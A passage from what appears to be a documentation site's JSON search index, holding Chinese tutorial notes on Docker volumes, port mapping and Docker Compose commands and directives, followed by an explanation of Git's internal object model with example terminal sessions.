ubuntu</code>\u6765\u5c06\u521b\u5efa\u7684\u6570\u636e\u5377\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\uff0c\u53ef\u540c\u65f6\u6302\u8f7d\u591a\u4e2a\u6570\u636e\u5377\u3002</p>"},{"location":"other/docker/#_19","title":"\u6302\u8f7d\u4e3b\u673a\u76ee\u5f55","text":"<p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06\u672c\u5730\u4e3b\u673a\u7684\u4e00\u4e2a\u76ee\u5f55\u6302\u8f7d\u5728\u5bb9\u5668\u4e2d\uff0c\u672c\u5730\u76ee\u5f55\u5fc5\u987b\u662f\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\uff0c\u6302\u8f7d\u540e\u9ed8\u8ba4\u662f\u53ef\u8bfb\u5199\u6743\u9650\uff0c\u53ef\u5728\u6302\u8f7d\u65f6\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u3002\u4f8b<code>docker run -it -v C:\\Users\\hejl:/mytt:ro ubuntu</code>\u3002</p>"},{"location":"other/docker/#_20","title":"\u7f51\u7edc","text":"<p>\u542f\u52a8\u5bb9\u5668\u65f6\u5982\u679c\u4e0d\u6307\u5b9a\u53c2\u6570\uff0c\u5219\u5728\u5bb9\u5668\u5916\u90e8\u65e0\u6cd5\u901a\u8fc7\u7f51\u7edc\u6765\u8bbf\u95ee\u5bb9\u5668\u5185\u7684\u7f51\u7edc\u5e94\u7528\u548c\u670d\u52a1\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>-P</code>\u53c2\u6570\uff0c\u5927\u5199P\u4f7f\u5f97Docker\u4f1a\u968f\u673a\u6620\u5c04\u4e00\u4e2a49000~49900\u7684\u7aef\u53e3\u4f5c\u4e3a\u5bb9\u5668\u7684\u5f00\u653e\u7f51\u7edc\u7aef\u53e3\u3002</p> <p>\u4e5f\u53ef\u901a\u8fc7<code>-p</code>\u5c0f\u5199p\u6307\u5b9a\u7aef\u53e3\uff0c\u5982<code>docker run -p 5000:5000 -p 3000:80 ubuntu</code>\u3002</p>"},{"location":"other/docker/#docker-compose","title":"Docker Compose","text":"<p>Compose\u7684\u5b9a\u4f4d\u662f\u5b9a\u4e49\u548c\u8fd0\u884c\u591a\u4e2aDocker\u5bb9\u5668\u7684\u5e94\u7528\uff0c\u5176\u4e2d\u6709\u4e24\u4e2a\u91cd\u8981\u7684\u6982\u5ff5:</p> <ul> <li>\u670d\u52a1(service): \u4e00\u4e2a\u5e94\u7528\u7684\u5bb9\u5668\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u5305\u62ec\u82e5\u5e72\u8fd0\u884c\u76f8\u540c\u955c\u50cf\u7684\u5bb9\u5668\u5b9e\u529b\u3002</li> <li>\u9879\u76ee(project): \u7531\u4e00\u7ec4\u5173\u8054\u7684\u5e94\u7528\u5bb9\u5668\u7ec4\u6210\u7684\u4e00\u4e2a\u5b8c\u6574\u4e1a\u52a1\u5355\u5143, \u5728<code>docker-compose.yml</code>\u6587\u4ef6\u4e2d\u5b9a\u4e49\u3002</li> </ul>"},{"location":"other/docker/#_21","title":"\u4e3b\u8981\u547d\u4ee4","text":"<p>\u5bf9\u4e8eCompose\u6765\u8bf4\uff0c\u5927\u90e8\u5206\u547d\u4ee4\u7684\u5bf9\u8c61\u65e2\u53ef\u4ee5\u662f\u9879\u76ee\u672c\u8eab\uff0c\u4e5f\u53ef\u4ee5\u662f\u9879\u76ee\u4e2d\u7684\u670d\u52a1\uff0c\u5982\u4e0d\u7279\u522b\u8bf4\u660e\uff0c\u547d\u4ee4\u7684\u5bf9\u8c61\u5c31\u662f\u9879\u76ee\uff0c\u4e5f\u5c31\u662f\u8bf4\u9879\u76ee\u4e2d\u7684\u6240\u6709\u670d\u52a1\u90fd\u4f1a\u53d7\u5230\u547d\u4ee4\u7684\u5f71\u54cd\u3002</p> <p>build</p> <p>\u7528\u4e8e\u6784\u5efa\u6216\u91cd\u65b0\u6784\u5efa\u9879\u76ee\u4e2d\u7684\u670d\u52a1\u5bb9\u5668\u3002</p> <p>\u670d\u52a1\u5bb9\u5668\u4e00\u65e6\u6784\u5efa\u540e\uff0c\u5c06\u4f1a\u5e26\u4e0a\u4e00\u4e2a\u6807\u8bb0\u540d\uff0c\u4f8b\u5982\u5bf9\u4e8eweb\u9879\u76ee\u4e2d\u7684\u4e00\u4e2adb\u5bb9\u5668\uff0c\u53ef\u80fd\u662fweb_db\u3002</p> <p>\u6709\u4e00\u4e9b\u989d\u5916\u9009\u9879:</p> <ul> <li>--force-rm\uff0c\u5220\u9664\u6784\u5efa\u8fc7\u7a0b\u4e2d\u7684\u4e34\u65f6\u5bb9\u5668</li> <li>--no-cache\uff0c\u6784\u5efa\u955c\u50cf\u8fc7\u7a0b\u4e2d\u4e0d\u4f7f\u7528\u7f13\u5b58</li> <li>--pull\uff0c\u59cb\u7ec8\u5c1d\u8bd5\u901a\u8fc7pull\u6765\u83b7\u53d6\u66f4\u65b0\u7248\u672c\u7684\u955c\u50cf</li> </ul> <p>config</p> <p>\u9a8c\u8bc1<code>docker-compose.yml</code>\u6587\u4ef6\u4e2d\u7684\u683c\u5f0f\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u6b63\u786e\u4f1a\u663e\u793a\u914d\u7f6e\uff0c\u9519\u8bef\u5219\u663e\u793a\u9519\u8bef\u539f\u56e0\u3002</p> <p>exec</p> <p>\u8fdb\u5165\u6307\u5b9a\u7684\u5bb9\u5668\uff0c\u5bb9\u5668\u5fc5\u987b\u662f\u8fd0\u884c\u72b6\u6001\u7684\u3002\u4f8b\u5982<code>docker-compose exec web sh</code></p> <p>run</p> <p>\u7528\u4e8e\u5728\u6307\u5b9a\u670d\u52a1\u4e0a\u8fd0\u884c\u4e00\u4e2a\u547d\u4ee4\u3002</p> <p>\u7c7b\u4f3c\u4e8e\u542f\u52a8\u5bb9\u5668\u540e\u8fd0\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff0c\u76f8\u5173\u7684\u5377\u3001\u94fe\u63a5\u7b49\u4e5f\u4f1a\u6309\u7167\u914d\u7f6e\u81ea\u52a8\u521b\u5efa\uff0c\u5982\u679c\u5b58\u5728\u5173\u8054\u7684\u670d\u52a1\u5219\u5173\u8054\u7684\u670d\u52a1\u4e5f\u4f1a\u81ea\u52a8\u542f\u52a8\u3002\u4f46\u6307\u5b9a\u547d\u4ee4\u4f1a\u8986\u76d6\u6389\u539f\u6709\u7684\u81ea\u52a8\u8fd0\u884c\u7684\u547d\u4ee4\uff0c\u4e14\u4e0d\u4f1a\u81ea\u52a8\u521b\u5efa\u7aef\u53e3\u4ee5\u514d\u51b2\u7a81\u3002</p> <p>\u989d\u5916\u9009\u9879:</p> <ul> <li>-d\uff0c\u540e\u53f0\u8fd0\u884c\u5bb9\u5668</li> <li>--no-deps\uff0c\u4e0d\u81ea\u52a8\u542f\u52a8\u5173\u8054\u7684\u5bb9\u5668</li> <li>-e KEY=VAL\uff0c\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</li> <li>--rm\uff0c\u8fd0\u884c\u547d\u4ee4\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668</li> <li>--service-ports\uff0c\u914d\u7f6e\u670d\u52a1\u7aef\u53e3\u5e76\u6620\u5c04\u5230\u672c\u5730\u4e3b\u673a</li> </ul> <p>\u4f8b\u5982: <code>docker-compose run --no-deps web python manage.py shell</code></p> <p>up</p> <p>\u5b83\u5c06\u5c1d\u8bd5\u81ea\u52a8\u5b8c\u6210\u5305\u62ec\u6784\u5efa\u955c\u50cf\u3001(\u91cd\u65b0)\u521b\u5efa\u670d\u52a1\uff0c\u542f\u52a8\u670d\u52a1\uff0c\u5e76\u5173\u8054\u670d\u52a1\u76f8\u5173\u5bb9\u5668\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002\u5927\u90e8\u5206\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u8be5\u547d\u4ee4\u6765\u542f\u52a8\u4e00\u4e2a\u9879\u76ee\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u542f\u52a8\u7684\u5bb9\u5668\u90fd\u5728\u524d\u53f0\uff0c\u4f1a\u8f93\u51fa\u5bb9\u5668\u7684\u8f93\u51fa\u4fe1\u606f\u4fbf\u4e8e\u8c03\u8bd5\u3002\u751f\u4ea7\u73af\u5883\u4e0b\u5efa\u8bae\u540e\u53f0\u542f\u52a8\u3002</p> <p>\u989d\u5916\u9009\u9879:</p> <ul> <li>-d\uff0c\u540e\u53f0\u8fd0\u884c\u5bb9\u5668</li> <li>--no-deps\uff0c\u4e0d\u542f\u52a8\u670d\u52a1\u94fe\u63a5\u7684\u5bb9\u5668 </li> <li>--force-recreate\uff0c\u5f3a\u5236\u91cd\u65b0\u521b\u5efa\u5bb9\u5668</li> <li>--no-create\uff0c\u5982\u679c\u5bb9\u5668\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u5219\u4e0d\u91cd\u65b0\u521b\u5efa</li> <li>-t\uff0c\u505c\u6b62\u5bb9\u5668\u65f6\u7684\u8d85\u65f6</li> </ul>"},{"location":"other/docker/#_22","title":"\u6a21\u677f\u6587\u4ef6","text":"<p>\u9ed8\u8ba4\u7684\u6587\u4ef6\u540d\u79f0\u4e3a<code>docker-compose.yml</code>\uff0c\u4e0b\u9762\u4e3b\u8981\u4ecb\u7ecd\u6838\u5fc3\u6307\u4ee4\u7684\u542b\u4e49\u3002</p> <p>\u6bcf\u4e2a\u670d\u52a1\u90fd\u5fc5\u987b\u901a\u8fc7image\u6307\u4ee4\u6216build\u6307\u4ee4\u6765\u81ea\u52a8\u6784\u5efa\u751f\u6210\u955c\u50cf\uff0c\u5982\u679c\u4f7f\u7528build\uff0cDockerfile\u4e2d\u8bbe\u7f6e\u7684\u9009\u9879(\u5982CMD\u3001EXPOSE\u3001VOLUME\u3001ENV)\u5c06\u4f1a\u81ea\u52a8\u88ab\u83b7\u53d6\uff0c\u65e0\u9700\u5728\u6a21\u677f\u6587\u4ef6\u4e2d\u91cd\u590d\u8bbe\u7f6e\u3002</p> <p>build</p> <p>\u6307\u5b9aDockerfile\u6240\u5728\u6587\u4ef6\u5939\u7684\u8def\u5f84\uff0c\u53ef\u4ee5\u662f\u7edd\u5bf9\u8def\u5f84\u6216\u662f\u76f8\u5bf9\u4e8e<code>docker-compose.yml</code>\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u3002\u5982: <pre><code>version: '3'\nservices:\n\n  webapp:\n    build: ./dir\n</code></pre></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528context\u6307\u4ee4\u6307\u5b9aDockerfile\u6240\u5728\u7684\u6587\u4ef6\u5939\u8def\u5f84\uff0c\u4f7f\u7528dockerfile\u6307\u4ee4\u6307\u5b9aDockerfile\u7684\u6587\u4ef6\u540d\uff0c\u4f7f\u7528arg\u6307\u4ee4\u6307\u5b9a\u6784\u5efa\u955c\u50cf\u65f6\u7684\u53d8\u91cf\u3002\u5982\uff1a <pre><code>version: '3'\nservices:\n\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: Dockerfile-alternate\n      args:\n        buildno: 1\n</code></pre></p> <p>command</p> <p>\u4f1a\u8986\u76d6\u6389\u5bb9\u5668\u542f\u52a8\u540e\u9ed8\u8ba4\u6267\u884c\u7684\u547d\u4ee4\u3002\u4f8b\u5982: <pre><code>version: \"3\"\nservices:\n\n  db:\n     image: mysql:8.0\n     command:\n      - --character-set-server=utf8mb4\n</code></pre> \u6ca1\u6709command\u65f6\u53ea\u542f\u52a8<code>mysqld</code>\uff0c\u52a0\u4e0a\u4ee5\u540e\u53d8\u4e3a<code>mysqld --character-set-server=utf8mb4</code></p> <p>depends_on</p> <p>\u89e3\u51b3\u5bb9\u5668\u4e4b\u95f4\u7684\u4f9d\u8d56\u3001\u542f\u52a8\u5148\u540e\u95ee\u9898\u3002</p> <p>environment</p> <p>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u4e24\u79cd\u683c\u5f0f: <pre><code>environment:\n  RACK_ENV: development\n  SESSION_SECRET:\n\nenvironment:\n  - RACK_ENV=development\n  - SESSION_SECRET\n</code></pre> \u5728\u8fd9\u91cc\u8bbe\u7f6e\u7684\u73af\u5883\u53d8\u91cf\uff0c\u4e0d\u80fd\u7528\u4e8e\u5bb9\u5668\u7684\u6784\u5efa\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u80fd\u5728\u5bb9\u5668\u8fd0\u884c\u4ee5\u540e\u624d\u80fd\u83b7\u53d6\u5230\u3002\u4f8b\u5982\u82e5dockerfie\u4e2d\u6709\u4e00\u5c42\u662f<code>RUN flask db migrate</code>\uff0c\u5219\u5b83\u65e0\u6cd5\u83b7\u53d6\u5230<code>docker-compose.yml</code>\u4e2d\u8bbe\u7f6e\u7684\u6570\u636e\u5e93\u8fde\u63a5\u7684\u73af\u5883\u53d8\u91cf\u3002\u6b63\u786e\u7684\u65b9\u6cd5\u662fdockerfile\u4e2d\u6ca1\u6709\u8fd9\u4e00\u5c42\uff0c\u800c\u662f\u901a\u8fc7<code>docker-compose run --rm web flask db migrate</code>\u6765\u8fbe\u5230\u76ee\u7684\u3002</p> <p>expose</p> <p>\u66b4\u6f0f\u7aef\u53e3\uff0c\u4f46\u4e0d\u6620\u5c04\u5230\u5bbf\u4e3b\u673a\uff0c\u53ea\u6709\u88ab\u8fde\u63a5\u7684\u670d\u52a1\u80fd\u901a\u8fc7\u8be5\u7aef\u53e3\u8bbf\u95ee\u3002</p> <p>image</p> <p>\u6307\u5b9a\u4e3a\u955c\u50cf\u540d\u79f0\u6216\u955c\u50cfID\uff0c\u5982\u679c\u955c\u50cf\u5728\u672c\u5730\u4e0d\u5b58\u5728\uff0c\u5c06\u4f1a\u5c1d\u8bd5\u62c9\u53d6\u8fd9\u4e2a\u955c\u50cf\u3002</p>"},{"location":"other/git/","title":"Git\u539f\u7406\u548c\u6280\u5de7","text":"<p>Git\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5185\u5bb9\u5bfb\u5740(content-addressable)\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u5728\u6b64\u4e4b\u4e0a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u7684\u7528\u6237\u754c\u9762\u3002\u4e86\u89e3\u5e95\u5c42\u539f\u7406\uff0c\u53ef\u4ee5\u66f4\u597d\u7684\u5e2e\u52a9\u6211\u4eec\u7406\u6e05\u601d\u8def\uff0c\u77e5\u9053\u771f\u6b63\u5728\u64cd\u4f5c\u4ec0\u4e48\uff0c\u800c\u4e0d\u4f1a\u8ff7\u5931\u5728\u5927\u91cf\u7684\u6307\u4ee4\u548c\u53c2\u6570\u4e0a\u3002</p>"},{"location":"other/git/#_1","title":"\u539f\u7406","text":""},{"location":"other/git/#_2","title":"\u533a\u57df","text":"<p>\u5de5\u4f5c\u533a(Working Directory)\uff0c\u5c31\u662f\u6211\u4eec\u5728\u7535\u8111\u91cc\u770b\u5230\u7684\u76ee\u5f55\uff0c\u6211\u4eec\u5bf9\u6587\u4ef6\u8fdb\u884c\u589e\u3001\u6539\u3001\u5220\u90fd\u53d1\u751f\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e2d\u3002</p> <p>\u5728\u8fd9\u91cc\u76ee\u5f55\u4e2d\uff0c\u6709\u4e00\u4e2a\u9690\u85cf\u76ee\u5f55<code>.git</code>\u5c31\u662fgit\u7684\u7248\u672c\u5e93(Repository)\u3002</p> <p>\u7248\u672c\u5e93\u4e2d\u5b58\u4e86\u5f88\u591a\u4e1c\u897f\uff0c\u5176\u4e2d\u8fd8\u6709\u4e00\u7247\u533a\u57df\uff0c\u4e00\u822c\u4e3a<code>.git/index</code>\u6587\u4ef6\uff0c\u6211\u4eec\u79f0\u4e3astage(\u6216index)\u6682\u5b58\u533a\u3002</p> <p>\u518d\u52a0\u4e0a\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u4f8b\u5982github\u4e0a\u7684repo\uff0c\u6211\u4eec\u5e73\u65f6\u505a\u7684\u5927\u91cf\u64cd\u4f5c\u90fd\u662f\u628a\u6587\u4ef6\u5728\u8fd9\u56db\u4e2a\u533a\u57df\u4e4b\u95f4\u76f8\u4e92\u79fb\u52a8\u3002 </p>"},{"location":"other/git/#_3","title":"\u5bf9\u8c61","text":"<p>\u5728git\u4e2d\uff0c\u9664\u4e86<code>init</code>\u3001<code>clone</code>\u7b49\u6211\u4eec\u5e38\u7528\u7684\u9ad8\u5c42\u547d\u4ee4(\u88ab\u79f0\u4e3aporcelain)\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5e95\u5c42\u547d\u4ee4(\u88ab\u79f0\u4e3aplumbing)\u3002\u4f8b\u5982<code>git hash-object</code>\u628a\u4e00\u4e2a\u6587\u4ef6\u8f6c\u6362\u4e3a\u4e00\u4e2agit\u5bf9\u8c61\uff0c<code>git cat-file</code>\u53ef\u4ee5\u6253\u5370\u51fa\u4e00\u4e2agit\u5bf9\u8c61\u3002</p> <p>\u90a3\u4e48git\u5bf9\u8c61\u5230\u5e95\u662f\u4ec0\u4e48\u5462\uff1f\u56e0\u4e3aGit\u7684\u6838\u5fc3\u662f\u4e00\u4e2a\u5185\u5bb9\u5bfb\u5740\u6587\u4ef6\u7cfb\u7edf\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u7b80\u5355\u7684\u952e\u503c\u5bf9\u6570\u636e\u5e93\u3002\u5f53\u6211\u4eec\u5411\u5b83\u63d2\u5165\u4e00\u4e2a\u4efb\u610f\u7c7b\u578b\u7684\u5185\u5bb9\u65f6\uff0c\u5b83\u4f1a\u8fd4\u56de\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u901a\u8fc7\u952e\u503c\u5bf9\u80fd\u591f\u5728\u4efb\u610f\u65f6\u523b\u518d\u6b21\u68c0\u7d22\u5230\u8be5\u5185\u5bb9\u3002</p> <p>\u5f53\u6211\u4eec\u521d\u59cb\u5316\u65f6\uff0c<code>.git</code>\u4e2d\u4f1a\u6709\u4e00\u4e2a\u6587\u4ef6\u5939<code>objects</code>\u4e13\u95e8\u5b58\u50a8git\u5bf9\u8c61: <pre><code>\u279c  testgit git init\nInitialized empty Git repository in /home/hejl/testgit/.git/\n\n\u279c  testgit git:(master) ls .git\nHEAD  branches  config  description  hooks  info  objects  refs\n</code></pre></p> <p>\u5f53\u6211\u4eec\u6dfb\u52a0\u4e00\u9879\u5185\u5bb9\u7684\u65f6\u5019\uff0c\u8fd9\u4e2aobjects\u6587\u4ef6\u5939\u5c31\u4f1a\u591a\u51fa\u4e00\u4e2a\u6587\u4ef6: <pre><code>\u279c  testgit git:(master) echo 'abc' &gt; test.txt\n\u279c  testgit git:(master) \u2717 git add .\n\u279c  testgit git:(master) \u2717 tree .git/objects/\n.git/objects/\n\u251c\u2500\u2500 8b\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 aef1b4abc478178b004d62031cf7fe6db6f903\n\u251c\u2500\u2500 info\n\u2514\u2500\u2500 pack\n\n3 directories, 1 file\n</code></pre> \u5b83\u7684\u8fc7\u7a0b\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7<code>sha1</code>\u7b97\u6cd5\u8ba1\u7b97\u51fa\u6587\u4ef6\u5185\u5bb9\u4e5f\u5c31\u662f<code>abc</code>\u7684hash\u503c\uff0c\u662f\u4e00\u4e2a40\u4f4d\u768416\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u7684\u524d\u4e24\u4f4d\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u540e38\u4f4d\u4f5c\u4e3a\u6587\u4ef6\u540d\u79f0\u3002\u56e0\u4e3a\u5927\u591a\u6570\u7684\u6587\u4ef6\u7cfb\u7edf\u90fd\u8ba8\u538c\u5355\u4e2a\u76ee\u5f55\u4e2d\u5305\u542b\u592a\u591a\u7684\u6587\u4ef6\uff0c\u8fd9\u4f1a\u51cf\u6162\u5176\u722c\u53d6\u7684\u901f\u5ea6\uff0cGit\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4f7f\u5f97\u7b2c\u4e00\u7ea7\u76ee\u5f55\u6700\u591a256\u4e2a\u3002\u6587\u4ef6\u672c\u8eab\u5c31\u662fGit object\uff0c\u5b83\u7684\u5934\u90e8\u5b9a\u4e49\u4e86\u7c7b\u578b\uff0c\u7d27\u8ddf\u7740\u662f\u4e00\u4e2aASCII\u7684\u7a7a\u683c(0x20)\uff0c\u7136\u540e\u662f\u5bf9\u8c61\u7684\u5927\u5c0f\u591a\u5c11\u5b57\u8282\uff0c\u7d27\u8ddf\u7740\u4e00\u4e2anull(0x00)\uff0c\u6700\u540e\u662f\u5bf9\u8c61\u672c\u8eab\u7684\u5185\u5bb9\u3002\u6574\u4e2a\u6587\u4ef6\u901a\u8fc7<code>zlib</code>\u538b\u7f29\u5b58\u50a8\u3002</p> <p>\u6709\u56db\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5b83\u4eec\u5206\u522b\u662f<code>blob</code>,<code>commit</code>,<code>tree</code>,<code>tag</code>\u3002\u5bf9\u8c61\u7684\u5bfb\u5740\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f2a\u7801\u6765\u8868\u8fbe: <pre><code>type object = blob | commit | tree | tag\nobjects = map&lt;string, object&gt;\n\ndef store(object):\n    id = sha1(object)\n    objects[id] = object\n\ndef load(id):\n    return objects[id]\n</code></pre> \u800c\u6bcf\u79cd\u5bf9\u8c61\u7684\u6570\u636e\u7ed3\u679c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f2a\u7801\u8868\u793a: <pre><code>type blob = array&lt;byte&gt;\ntype tree = map&lt;string, tree | file&gt;\ntype commit = struct{\n    parent: array&lt;commit&gt;\n    author: string\n    message: string\n    snapshot: tree\n}\n</code></pre></p>"},{"location":"other/git/#blob","title":"blob","text":"<p>\u8be5\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\u5b58\u50a8\u7684\u539f\u59cb\u5185\u5bb9\uff0c\u4f8b\u5982\u521a\u624d\u65b0\u589e\u7684\u5bf9\u8c61\u5c31\u662f\u8fd9\u79cd\u7c7b\u578b: <pre><code>\u279c  testgit git:(master) \u2717 git cat-file -t 8bae\nblob\n\u279c  testgit git:(master) \u2717 git cat-file -p 8bae\nabc\n</code></pre> \u4f46\u5b83\u4e5f\u53ea\u5b58\u50a8\u5185\u5bb9\uff0c\u4f8b\u5982\u5de5\u4f5c\u533a\u4e2d\u8be5\u6587\u4ef6\u7684\u8def\u5f84\u3001\u6587\u4ef6\u540d\u79f0\u3001\u521b\u5efa\u65f6\u95f4\u7b49\u90fd\u4e0d\u5b58\u50a8\u5728\u8fd9\u79cd\u7c7b\u578b\u7684git\u5bf9\u8c61\u4e2d\u3002</p>"},{"location":"other/git/#commit","title":"commit","text":"<p>\u5f53\u6211\u4eec\u8fdb\u884c\u4e00\u6b21\u63d0\u4ea4\u64cd\u4f5c\u4e4b\u540e\uff0c\u5c31\u4f1a\u4ea7\u751f\u4e24\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u4e00\u4e2a\u662ftree\u5bf9\u8c61\u7a0d\u540e\u518d\u8bf4\uff0c\u53e6\u4e00\u4e2a\u5c31\u662fcommit\u5bf9\u8c61\u3002\u5b83\u7684\u5185\u5bb9\u5305\u62ec: <pre><code>\u279c  testgit git:(master) \u2717 git commit -m \"first commit\"\n[master (root-commit) 37b766f] first commit\n 1 file changed, 1 insertion(+)\n create mode 100644 test.txt\n\u279c  testgit git:(master) tree .git/objects/\n.git/objects/\n\u251c\u2500\u2500 37\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 b766ff8084b9ea2e9a159bdb35b286a3406d3e\n\u251c\u2500\u2500 8b\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 aef1b4abc478178b004d62031cf7fe6db6f903\n\u251c\u2500\u2500 93\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 4a610d6024005decae12f6ec4c242caa2a4de4\n\u251c\u2500\u2500 info\n\u2514\u2500\u2500 pack\n\n5 directories, 3 files\n\u279c  testgit git:(master) git cat-file -p 37b7\ntree 934a610d6024005decae12f6ec4c242caa2a4de4\nauthor hjlarry &lt;hjlarry@163.com&gt; 1582182460 +0800\ncommitter hjlarry &lt;hjlarry@163.com&gt; 1582182460 +0800\n\nfirst commit\n</code></pre> tree\u8868\u793a\u672c\u6b21\u63d0\u4ea4\u4ea7\u751f\u7684\u53e6\u4e00\u4e2atree\u7c7b\u578bgit\u5bf9\u8c61\u7684\u8def\u5f84\u5730\u5740\u3002author\u548ccommitter\u5927\u591a\u6570\u60c5\u51b5\u76f8\u540c\uff0c\u4f46\u6709\u65f6\u6bd4\u5982\u8bf4\u6211\u4eec\u628a\u522b\u4eba\u5206\u652f\u7684\u4e00\u4e2acommit\u901a\u8fc7<code>cherry-pick</code>\u52a0\u5165\u6211\u4eec\u7684\u5206\u652f\uff0c\u8fd9\u65f6committer\u662f\u6211\u4eec\u81ea\u5df1\uff0cauthor\u4ecd\u7136\u662f\u522b\u4eba\u3002\u8fd9\u91ccauthor\u9700\u8981\u5305\u542busername\u3001email(\u6240\u4ee5\u521a\u4f7f\u7528git\u65f6\u8981\u6c42\u5728gitconfig\u4e2d\u8bbe\u7f6e\u7528\u6237\u540d\u548c\u90ae\u7bb1)\u3001\u65f6\u95f4\u6233\u3002\u7d27\u8ddf\u7740\u662f\u63d0\u4ea4\u7684message\u3002</p> <p>\u5b9e\u9645\u4e0a\u5b8c\u6574\u7684commit\u5bf9\u8c61\u7684\u5185\u5bb9\u6b63\u662f\u90ae\u4ef6\u7684\u4e00\u79cd\u7b80\u5355\u7684\u683c\u5f0f\uff0c\u6e90\u4e8eRFC2822\u3002\u8fd8\u5305\u62ec\u4e00\u4e2aparent\uff0c\u6307\u5411\u672c\u6b21\u63d0\u4ea4\u7684\u7236commit\u5bf9\u8c61\u7684\u8def\u5f84\u5730\u5740\uff0c\u56e0\u4e3a\u73b0\u5728\u662f\u7b2c\u4e00\u6b21\u63d0\u4ea4\uff0c\u6ca1\u6709parent\u3002\u4ee5\u53ca\u4e00\u4e2agpgsig\uff0c\u901a\u8fc7PGP\u7b7e\u540d\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u901a\u8fc7<code>cat-file</code>\u770b\u4e0d\u5230\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u901a\u8fc7<code>git log</code>\u67e5\u770b\u63d0\u4ea4\u65e5\u5fd7\u7684\u4fe1\u606f\uff0c\u5c31\u662f\u4e00\u5c42\u5c42\u7684\u9012\u5f52\u67e5\u770b\u7236\u5bf9\u8c61\u62ff\u5230\u7684\u3002</p>"},{"location":"other/git/#tree","title":"tree","text":"<p>\u6811\u5bf9\u8c61\u89e3\u51b3\u7684\u662f\u6587\u4ef6\u540d\u4fdd\u5b58\u7684\u95ee\u9898\uff0c\u5e76\u80fd\u591f\u5c06\u591a\u4e2a\u6587\u4ef6\u7ec4\u7ec7\u5230\u4e00\u8d77\u3002\u6211\u4eec\u65b0\u5efa\u4e00\u6b21\u63d0\u4ea4\uff0c\u6dfb\u52a0\u66f4\u591a\u5185\u5bb9\u4e3a\u4f8b: <pre><code>\u279c  testgit git:(master) echo 'abcdef' &gt; test.txt\n\u279c  testgit git:(master) \u2717 mkdir adir\n\u279c  testgit git:(master) \u2717 echo '123' &gt; adir/tt.txt\n\u279c  testgit git:(master) \u2717 git add .\n\u279c  testgit git:(master) \u2717 git commit -m \"third commit\"\n[master 79380b0] third commit\n 2 files changed, 2 insertions(+), 1 deletion(-)\n create mode 100644 adir/tt.txt\n\u279c  testgit git:(master) git cat-file -p 1bc4\n040000 tree f1af0a5ebfe47de9d2d6db753088462b797b2075    adir\n100644 blob 0373d9336f8c8ee90faff225de842888e884a48b    test.txt\n\u279c  testgit git:(master) git cat-file -p f1af\n100644 blob 190a18037c64c43e6b11489df4bf0b9eb6d2c9bf    tt.txt\n</code></pre> \u5b83\u4f1a\u628a\u5f53\u524d\u7684\u76ee\u5f55\u7ed3\u6784\u6253\u4e00\u4e2a\u5feb\u7167\uff0c\u76f8\u5f53\u4e8e\u4ee5\u8868\u683c\u7684\u5f62\u5f0f\u8bb0\u5f55\u8be5\u76ee\u5f55\u4e0b\u6bcf\u4e00\u4e2a\u76ee\u6807\u7684\u6743\u9650\u3001\u7c7b\u578b(\u901a\u5e38\u662f\u6587\u4ef6blob\uff0c\u6216\u8005\u662f\u6587\u4ef6\u5939\u53d8\u6210\u4e00\u4e2a\u65b0\u7684tree\u5bf9\u8c61)\u3001\u54c8\u5e0c\u503c(\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6587\u4ef6\u8def\u5f84)\u3001\u6587\u4ef6\u540d\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u4eec\u901a\u8fc7<code>git add *</code>\u65f6\u4f1a\u628a\u5de5\u4f5c\u533a\u6587\u4ef6\u7684\u6587\u4ef6\u5185\u5bb9\u751f\u6210\u4e00\u4e2ablob 